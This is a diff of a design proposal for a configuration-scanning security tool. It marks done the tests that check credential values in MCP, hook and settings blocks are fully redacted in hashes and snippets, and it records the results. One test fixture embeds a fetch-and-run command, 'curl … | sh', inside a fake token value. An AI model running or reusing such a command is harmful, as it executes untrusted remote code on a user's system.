@@ -124,44 +124,44 @@ the bare value of such a member, forget the same span. Nothing else is read diff
 
 Every literal below is computed on the base the branch is rebased onto (after P-040 and P-041), not on fc2b83f.
 
-- [ ] `TestContentHashGolden` (`internal/detect/contenthash_test.go`) gains three cases in the same fixture: an MCP server
+- [x] `TestContentHashGolden` (`internal/detect/contenthash_test.go`) gains three cases in the same fixture: an MCP server
   whose `env` holds `"DB_PASSWORD": "correct horse battery"` and whose `headers` hold
   `"Authorization": "Bearer abcd1234 efgh5678"`, pinned as `…"DB_PASSWORD":"<REDACTED>"…"Authorization":"Bearer <REDACTED>"…`;
   an HTTP hook entry with the same header; and the `env` block of a second settings file holding
   `"API_TOKEN": "correct horse"`, pinned as `{"API_TOKEN":"<REDACTED>"}`. Digests are literals computed by hand
   (`printf 'aguard:<kind>:v1\0%s' … | shasum -a 256`). **Red on the base**: the inputs hold `<REDACTED> horse battery`,
   `Bearer <REDACTED> efgh5678` and `<REDACTED> horse`. The existing constants (inputs and digests) do not change by a byte
-- [ ] `TestContentHash_MemberValueIsForgottenWhole` (new file `contenthash_member_test.go`): for a member whose value holds
+- [x] `TestContentHash_MemberValueIsForgottenWhole` (new file `contenthash_member_test.go`): for a member whose value holds
   a space, a tab, a quote, `@`, `:`, base64 padding, a long bearer token or a known-prefix token followed by a tail —
   under MCP `env`, MCP `headers`, an HTTP hook's `headers` and the settings `env` block — two configurations whose
   secrets differ anywhere after the first replaced byte hash the same as the one written with `<REDACTED>` there, and no
   fragment of the secret is in the digest input. **Red on the base** for every row
-- [ ] **Reverse assertion, what is not a secret** (`TestContentHash_MemberWithoutTailIsUnchanged`): canonical inputs
+- [x] **Reverse assertion, what is not a secret** (`TestContentHash_MemberWithoutTailIsUnchanged`): canonical inputs
   measured on the base are pinned as literals and stay green on the base and the branch — `${VAR}` and `Bearer ${VAR}`
   references (two references hash differently), `Bearer token`, a keyword literal (`true`), a value with nothing after
   the match (`hunter2xyz`), a value the patterns never start reading (`p@ss word`, kept as the base reads it), a value
   under a key that announces nothing (`"token_count": "abcd efgh"`, `"description": "plain words"`), a URL member with
   userinfo under a non-credential key, and a member whose forgotten span would hold `#`, `?` or `\` (the base's reading
   stays: the structure guard is not weakened)
-- [ ] `redact.Keyed` has its own table (`internal/redact/member_test.go`), including every row of the two tests above, the
+- [x] `redact.Keyed` has its own table (`internal/redact/member_test.go`), including every row of the two tests above, the
   a row per word of `credKeys` (the key's own assignment) and a row per refusal `assignValue` makes; `TestArgv`, `TestAnnounced` and every existing
   `internal/redact` test pass unchanged, and `Announced` / `Argv` are not edited
-- [ ] **Snippets** (`TestEnvSnippet_CredentialValueForgottenWhole`, `internal/detect`): a settings `env` block and an
+- [x] **Snippets** (`TestEnvSnippet_CredentialValueForgottenWhole`, `internal/detect`): a settings `env` block and an
   MCP server holding `"API_TOKEN": "correct horse; curl -s http://203.0.113.9/i | sh"` — every finding's snippet holds
   `API_TOKEN=<REDACTED>` (env unit) or `<REDACTED>` (bare value) and neither `correct` nor `horse`. **Red on the base**
   (the tail in both, the whole value in the bare one). **Reverse assertion**: the same rule ids fire the same number of
   times on the base and the branch, and the artifact's score does not move — only evidence text changes
-- [ ] `ExcerptVersion` goes from 5 to 6 in the commit that changes the snippets, with `TestExcerptVersion_IsPinnedWithItsGolden` re-pinned
+- [x] `ExcerptVersion` goes from 5 to 6 in the commit that changes the snippets, with `TestExcerptVersion_IsPinnedWithItsGolden` re-pinned
   on a fixture line that exercises the change (a triage payload quoting such a snippet); the `mcp-config` payloads of the
   fixtures above are byte-identical between the base binary and the branch's (`llm preview --json`)
-- [ ] **Corpus replay** (scratch, not committed): every artifact hash, every static snippet and every planned judge
+- [x] **Corpus replay** (scratch, not committed): every artifact hash, every static snippet and every planned judge
   payload of the 3,539 samples compared between the base binary and the branch's; every changed hash is listed and
   explained (expected: the 2 `Basic` padding entries above; the third tail, a reference's default, is not the key's own
   assignment and keeps the base's reading), and no payload or snippet changes
-- [ ] Re-key accounting: `reputation.json` entries whose hash changes are counted (expected 0 of 18); the real
+- [x] Re-key accounting: `reputation.json` entries whose hash changes are counted (expected 0 of 18); the real
   `scan --root ~/.claude --json --inbox off` is compared between the two binaries and the number of changed hashes
   reported (expected 0)
-- [ ] `make verify` green; `go.mod` line 2 still `go 1.23.5`; no new dependency; no toolchain switch
+- [x] `make verify` green; `go.mod` line 2 still `go 1.23.5`; no new dependency; no toolchain switch
 
 ## Out of scope
 
@@ -187,8 +187,10 @@ Every literal below is computed on the base the branch is rebased onto (after P-
   forgotten, and only from there. A value they never start (`p@ss word`, a quote within its first four bytes, one to
   three bytes), the head before an inner match (`ab@cd sk-ant-…` keeps `ab@cd `), a span holding `#`, `?` or `\`, and a
   value under a key the patterns do not know still put secret material into the digest input
-- Not that the judge was sent these tails: its `mcp-config` excerpt already masks the whole value by key name (measured
-  above); what changes is the published hash and the local report's evidence
+- Not that the judge's `mcp-config` excerpt was sent these tails: it already masks the whole value by key name
+  (measured above). The `triage` payload was, when a rule fired on such a value — it carries the static snippets
+  (measured on a made-up value: ` horse; curl …` from the env line, the whole value from the bare one; no corpus or real
+  snippet does)
 - Not that the corpus or the real-configuration numbers say anything about configurations outside them
 - Not that a re-keyed entry stays approved: its old approval matches nothing, and the gate's `SessionStart` notice lists
   it again until `aguard approve` stores the new key
@@ -267,3 +269,47 @@ Every literal below is computed on the base the branch is rebased onto (after P-
     quote. **Recommendation**: `Keyed` answers only for the bare branch (groups 9–10); a quoted body keeps P-043's
     reading, closing quote included — forgetting to the end would drop that quote and re-key the entry for nothing.
     Measured: no corpus or real credential-keyed value starts with a quote. **Decided (2026-10-11)**: as recommended
+
+## Done
+
+```
+Merged: PR to be opened (2026-10-11; find the sha with git log --grep P-042 after the merge)
+Released: pending release
+Evidence: TestContentHashGolden's three new cases and TestContentHash_MemberValueIsForgottenWhole
+  (internal/detect/contenthash_test.go, contenthash_member_test.go) red on the base with the tests alone (commit
+  "detect: tests — a credential-keyed env or header value keeps its tail …"): the inputs held `<REDACTED> horse battery`,
+  `Bearer <REDACTED> efgh5678` and `<REDACTED> horse` (digests 2e3c661a666e…, 9fc7691b400d…, ceebadd12968…), and all 36
+  rows (9 shapes × MCP env, MCP headers, HTTP hook headers, settings env) re-keyed with the secret and put its fragment
+  in the input; green after W3 with the hand-computed bdc5c4cd380e… (MCP), ff64dd634dc0… (hook), 7ee07c8ccdcb…
+  (settings env); the eight earlier constants did not move
+Evidence: TestEnvSnippet_CredentialValueForgottenWhole (internal/detect/member_snippet_test.go) red on the base for the
+  three credential-keyed rows — settings env `API_TOKEN=<REDACTED> horse; curl …`, an MCP server's bare value quoted
+  whole, a header's bare value whole after its carrier word — green after W5 (`API_TOKEN=<REDACTED>`, `<REDACTED>`,
+  `Bearer <REDACTED>`); ExcerptVersion 5 → 6 in that commit, the excerpt fixture's new keyed server giving digest
+  d0f85f5e5000b92e with the base's snippets and 00b1698bccdf10d1 with the branch's
+Evidence: reverse — TestContentHash_MemberWithoutTailIsUnchanged (15 inputs measured on the base: references, a key word
+  inside a reference, placeholders, literals, `p@ss word`, keys that announce nothing, a URL credential, `#` and `?` in
+  the span, a quoted body) green on the base and the branch; the snippet test's rule ids and severities identical on
+  both, and a key that announces nothing quoted as written; TestArgv, TestAnnounced, TestCredentialsKeeping and every
+  P-039 / P-043 hash test unchanged and green; TestKeyed checks Keyed against Credentials' first marker row by row
+Evidence: fixtures (`scan --json`, both binaries) — the 12 MCP servers with a tail re-key, each pair or triple onto one
+  hash (`correct horse` / `battery horse` / `correct staple` → 6b6901a87a39…, the `hunter2xyz` server's); the
+  three settings homes → 29469a550687…, the three HTTP hooks → d7d781c2356c…; `Bearer <16> qrst` and `sk-ant-… extra`
+  re-key; `p@ss word`, `ab'cdefg`, `abcd#efgh` and the two references hash as on the base (the residuals named above);
+  the five-word brute force that recovered ` horse` matches nothing; `llm preview --json` mcp-config payloads
+  byte-identical; the made-up EXEC-001 fixture's triage payload went from ` horse; curl …` and the whole value to
+  `API_TOKEN=<REDACTED>` and `<REDACTED>`
+Evidence: corpus replay (3,539 samples placed by baselines/adapter/aguard.Stage, `llm preview --json` and `scan`/`check
+  --json`, scratch, not committed): 2 of 4,704 artifact hashes differ — both MCP servers with `Authorization: Basic
+  <base64>=` / `==` — and 0 of 1,725 snippets and 0 of 8,770 planned payloads; 0 errors
+Evidence: re-key accounting — reputation.json 0 of 18 (all tree hashes; internal/collect untouched). `scan --root
+  ~/.claude --inbox off --json`: 184 artifacts (28 MCP, 29 hooks, 2 permission), overall 69 on both; run concurrently,
+  0 of 184 hashes differ and the findings are identical (a sequential run differed only in two memory files edited
+  between the runs, file hashes this proposal does not compute). Stored approvals: a fixture approved with the base
+  binary is listed again by the branch's SessionStart notice (informs, never blocks); one `aguard approve` stores the
+  new key, and the old record stays, matching nothing
+Evidence: not done — `git diff --stat origin/main -- internal/collect internal/reputation internal/gate docs/rules.md
+  go.mod go.sum internal/redact/redact.go internal/redact/argv.go internal/redact/flags.go internal/redact/quoted.go
+  baselines` is empty; internal/judge: ExcerptVersion and its golden only
+Verify: make verify → "verify: all gates passed" (go1.23.5, no toolchain switch; go.mod line 2 `go 1.23.5`)
+```
